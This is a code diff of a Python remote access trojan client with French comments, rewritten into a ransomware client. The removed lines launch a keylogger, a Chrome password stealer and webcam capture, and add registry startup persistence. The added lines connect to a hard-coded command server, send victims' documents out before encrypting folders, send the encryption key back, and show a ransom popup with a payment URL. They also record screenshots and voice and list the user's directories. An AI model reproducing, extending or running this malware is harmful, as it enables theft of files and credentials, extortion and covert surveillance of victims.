@@ -1,70 +1,49 @@
-import subprocess
 import socket
-import json
-import threading
 import os
-import sys
-import time
 import ctypes
-import winreg
+from screenshot_module import take_and_send_screenshot
+from ransomware_module import encrypt_directory, decrypt_directory, load_key, generate_key
+from screenshots import screenshot
+import voice_module  # Pour l'enregistrement vocal
 
-SERVER_IP = "192.168.198.200"
-SERVER_PORT = 5001
+SERVER_IP = "192.168.248.128"
+PORT = 5001
+KEY_FILE = "ransom_key.key"
+PAYMENT_URL = "http://192.168.248.128:4242/pay"
 
-if getattr(sys, 'frozen', False):
-    BASE_DIR = os.path.dirname(sys.executable)
-else:
-    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-
-KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
-PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
-WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
-KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
-REMOTE_EXE = os.path.join(BASE_DIR, "remote.exe")
-SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
-CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
-SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshot")
-VOICE_EXE = os.path.join(BASE_DIR, "voice_module.exe")
-RANSOMWARE_EXE = os.path.join(BASE_DIR, "ransomware_module.exe")
-
-
-def hide_file(path):
-    FILE_ATTRIBUTE_HIDDEN = 0x02
-    FILE_ATTRIBUTE_SYSTEM = 0x04
-    attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
-    ctypes.windll.kernel32.SetFileAttributesW(path, attrs)
-
-
-def add_to_startup(exe_path, name="winupd"):
-    key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER,
-        r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0,
-        winreg.KEY_SET_VALUE
-    )
-    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
-    winreg.CloseKey(key)
-
-
-def send_file(client_socket, file_path, file_type):
+def send_key_to_server(sock, key_file_path):
     try:
-        if not os.path.exists(file_path):
-            print(f"[-] Fichier non trouvé : {file_path}")
-            return
-
-        with open(file_path, "rb") as file:
-            file_data = file.read()
-
-        payload = json.dumps({
-            "type": file_type,
-            "filename": os.path.basename(file_path),
-            "data": file_data.hex()
-        })
-        client_socket.send(payload.encode('utf-8'))
-        print(f"[+] Fichier '{file_path}' envoyé au serveur.")
+        with open(key_file_path, "rb") as f:
+            key_data = f.read()
+        sock.sendall(b"key:" + key_data)
     except Exception as e:
-        print(f"[Erreur] lors de l'envoi : {e}")
+        print(f"Erreur d'envoi de la clé : {e}")
 
+def save_encrypted_dir(path):
+    if not os.path.exists("encrypted_dirs.txt"):
+        with open("encrypted_dirs.txt", "w") as f:
+            f.write(path + "\n")
+    else:
+        with open("encrypted_dirs.txt", "r+") as f:
+            lines = f.readlines()
+            if path + "\n" not in lines:
+                f.write(path + "\n")
+
+def get_encrypted_dirs():
+    if not os.path.exists("encrypted_dirs.txt"):
+        return []
+    with open("encrypted_dirs.txt", "r") as f:
+        return [line.strip() for line in f if line.strip()]
+
+def remove_decrypted_dir(path):
+    if not os.path.exists("encrypted_dirs.txt"):
+        return
+    with open("encrypted_dirs.txt", "r") as f:
+        lines = f.readlines()
+    with open("encrypted_dirs.txt", "w") as f:
+        for line in lines:
+            if line.strip() != path:
+                f.write(line)
 
 def exfiltrate_file(file_path, sock):
     try:
@@ -79,103 +58,98 @@ def exfiltrate_file(file_path, sock):
                 if not chunk:
                     break
                 sock.sendall(chunk)
-        print(f"[+] Fichier exfiltré : {file_path}")
+        print(f"[+] Exfiltré : {file_path}")
     except Exception as e:
-        print(f"[!] Erreur exfiltration : {e}")
+        print(f"Erreur d'exfiltration : {e}")
 
+def popup_message(message):
+    ctypes.windll.user32.MessageBoxW(0, message, "!!! Vos fichiers sont chiffrés !!!", 0x40 | 0x1)
 
-def wait_for_file(file_path, timeout=10):
-    start_time = time.time()
-    while not os.path.exists(file_path):
-        if time.time() - start_time > timeout:
-            print(f"[-] Temps d'attente dépassé pour le fichier : {file_path}")
-            return False
-        time.sleep(1)
-    return True
+def connect_to_server():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
+        try:
+            print("[DEBUG] Connexion au serveur...")
+            client.connect((SERVER_IP, PORT))
+            print("[DEBUG] Connexion établie.")
 
+            if not os.path.exists(KEY_FILE):
+                generate_key()
 
-def handle_commands(client_socket):
-    try:
-        while True:
-            command = client_socket.recv(1024).decode('utf-8')
-            print(f"[+] Commande reçue : {command}")
+            while True:
+                command = client.recv(1024).decode(errors="ignore")
+                if not command:
+                    break
 
-            if command == "keylogger":
-                if wait_for_file(KEYLOG_FILE):
-                    send_file(client_socket, KEYLOG_FILE, "keystroke")
-                    os.remove(KEYLOG_FILE)
+                print(f"[DEBUG] Commande reçue : {command}")
 
-            elif command == "capture_image":
-                subprocess.run([WEBCAM_EXE, "image"], check=True)
-                images = [os.path.join(CAPTURE_DIR, f) for f in os.listdir(CAPTURE_DIR) if f.endswith(".jpg")]
-                if images:
-                    latest_image = max(images, key=os.path.getctime)
-                    if wait_for_file(latest_image):
-                        send_file(client_socket, latest_image, "webcam_capture")
-                        os.remove(latest_image)
+                if command.startswith("encrypt:"):
+                    directory = command.split(":", 1)[1]
+                    key = load_key()
 
-            elif command == "capture_video":
-                subprocess.run([WEBCAM_EXE, "video"], check=True)
-                videos = [os.path.join(CAPTURE_DIR, f) for f in os.listdir(CAPTURE_DIR) if f.endswith(".avi")]
-                if videos:
-                    latest_video = max(videos, key=os.path.getctime)
-                    if wait_for_file(latest_video):
-                        send_file(client_socket, latest_video, "webcam_capture")
-                        os.remove(latest_video)
+                    for root, _, files in os.walk(directory):
+                        for file in files:
+                            if file.lower().endswith((".pdf", ".txt", ".docx", ".xls", ".xlsx")):
+                                file_path = os.path.join(root, file)
+                                exfiltrate_file(file_path, client)
 
-            elif command == "remote":
-                print("[*] remote.exe est lancé !")
-                subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                    encrypt_directory(directory, key)
+                    save_encrypted_dir(directory)
+                    send_key_to_server(client, KEY_FILE)
+                    popup_message(f"Vos fichiers dans {directory} ont été chiffrés.\n\nPour les déchiffrer, rendez-vous ici :\n{PAYMENT_URL}")
+                    client.sendall(f"[+] Chiffrement terminé pour {directory}".encode())
 
-            elif command == "screenshot":
-                subprocess.run([SCREENSHOT_EXE], check=True)
-                images = [os.path.join(SCREENSHOT_DIR, f) for f in os.listdir(SCREENSHOT_DIR) if f.startswith("screenshot_")]
-                if images:
-                    latest = max(images, key=os.path.getctime)
-                    if wait_for_file(latest):
-                        send_file(client_socket, latest, "screenshot")
-                        os.remove(latest)
+                elif command.startswith("decrypt:"):
+                    directory = command.split(":", 1)[1]
+                    key = load_key()
+                    decrypt_directory(directory, key)
+                    remove_decrypted_dir(directory)
+                    client.sendall(f"[+] Dossier déchiffré : {directory}".encode())
 
-            elif command == "voice":
-                subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                elif command == "screenshot":
+                    take_and_send_screenshot(client)
 
-            elif command.startswith("encrypt:"):
-                folder = command.split(":", 1)[1]
+                elif command == "key_request":
+                    send_key_to_server(client, KEY_FILE)
+                    encrypted_dirs = get_encrypted_dirs()
+                    message = "\n".join(encrypted_dirs) if encrypted_dirs else "Aucun dossier chiffré enregistré."
+                    client.sendall(message.encode())
 
-                # Étape 1 : Exfiltrer les fichiers ciblés avant chiffrement
-                for root, _, files in os.walk(folder):
-                    for file in files:
-                        if file.lower().endswith((".pdf", ".txt", ".docx", ".xls", ".xlsx")):
-                            file_path = os.path.join(root, file)
-                            exfiltrate_file(file_path, client_socket)
+                elif command == "listdirs":
+                    user_path = os.path.expanduser("~")
+                    top_level_dirs = []
+                    for name in os.listdir(user_path):
+                        full_path = os.path.join(user_path, name)
+                        if os.path.isdir(full_path):
+                            top_level_dirs.append(full_path)
+                            try:
+                                subdirs = [
+                                    os.path.join(full_path, d)
+                                    for d in os.listdir(full_path)
+                                    if os.path.isdir(os.path.join(full_path, d))
+                                ]
+                                top_level_dirs.extend(subdirs)
+                            except Exception: 
+                                top_level_dirs.append(f"{full_path}\\[Erreur accès]")
+                    message = "\n".join(top_level_dirs) if top_level_dirs else "Aucun dossier trouvé."
+                    client.sendall(message.encode())
 
-                # Étape 2 : Lancer le ransomware pour chiffrer
-                subprocess.Popen([RANSOMWARE_EXE, "encrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)
+                elif command == "list_encrypted":
+                    encrypted_dirs = get_encrypted_dirs()
+                    message = "\n".join(encrypted_dirs) if encrypted_dirs else "Aucun dossier chiffré."
+                    client.sendall(message.encode())
 
-            elif command.startswith("decrypt:"):
-                folder = command.split(":", 1)[1]
-                subprocess.Popen([RANSOMWARE_EXE, "decrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)
+                elif command == "voice":
+                    print("[DEBUG] Lancement enregistrement vocal")
+                    voice_module.record_and_send(client)
 
-    except Exception as e:
-        print(f"[Erreur] de connexion : {e}")
+                elif command == "exit":
+                    print("[DEBUG] Fermeture demandée.")
+                    break
 
-
-def main():
-    # Cacher les exécutables à la fin si souhaité
-    # for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE, KEYLOG_FILE, SCREENSHOT_DIR, CAPTURE_DIR, sys.executable]:
-    #     if os.path.exists(exe):
-    #         hide_file(exe)
-
-    add_to_startup(os.path.join(BASE_DIR, "rat_client.exe"))
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((SERVER_IP, SERVER_PORT))
-
-        subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.run([PASSWORD_EXE], check=True)
-
-        handle_commands(s)
-
+        except ConnectionRefusedError:
+            print("Connexion refusée au serveur.")
+        except Exception as e:
+            print(f"[!] Erreur dans la boucle principale : {e}")
 
 if __name__ == "__main__":
-    main()
+    connect_to_server()
